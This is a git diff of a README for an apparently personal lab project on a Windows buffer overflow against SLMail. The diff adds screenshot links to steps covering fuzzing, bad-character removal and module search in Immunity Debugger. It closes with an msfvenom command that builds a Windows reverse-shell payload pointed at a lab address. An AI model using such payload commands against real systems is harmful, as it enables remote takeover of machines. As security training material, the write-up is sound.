@@ -119,37 +119,43 @@ This project is centered on understanding and executing a Windows buffer overflo
 - Updated **“fuzzy.py”** to include bad characters, and modified the buffer accordingly.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF18.png" alt="">
 </p>
 
 - Restarted slmail.clp and Immunity debugger. Ran **“python fuzzy.py”** from Kali, noting an output of 2865 bytes.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF19.png" alt="">
 </p>
 
 - Followed ESP in Immunity debugger's dump, identifying sequences to be removed from **“fuzzy.py”**.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF20-1.png" alt="">
+</p>
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF20-2.png" alt="">
 </p>
 
 - Repeated the process with updated **“fuzzy.py”**, observing a byte decrease in output.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF21.png" alt="">
 </p>
 
 - Made another update to **“fuzzy.py”**, removing the identified bad character.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF22-1.png" alt="">
+</p>
+<p align="center">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF22-2.png" alt="">
 </p>
 
 - Reset tools, searched for mona modules in Immunity debugger, then searched for the appropriate DLL.
 
 <p align="center">
-  <img src="" alt="">
+  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF23.png" alt="">
 </p>
 
 - Crafted shellcode with **“msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”**.
